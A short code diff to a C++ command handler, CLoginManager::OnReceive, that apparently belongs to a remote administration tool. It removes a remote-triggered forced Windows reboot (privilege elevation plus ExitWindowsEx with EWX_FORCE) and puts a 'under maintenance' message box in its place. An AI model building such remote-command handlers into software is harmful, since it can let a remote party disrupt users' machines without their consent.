@@ -452,9 +452,7 @@ void CLoginManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 
 	case COMMAND_REBOOT:
 	{
-		EnablePrivilege(SE_SHUTDOWN_NAME, TRUE);
-		ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
-		EnablePrivilege(SE_SHUTDOWN_NAME, FALSE);
+		MessageBox(NULL, _T("under maintenance"), _T("System Status"), MB_OK | MB_ICONINFORMATION);
 	}
 	break;
 	case COMMAND_SHUTDOWN:
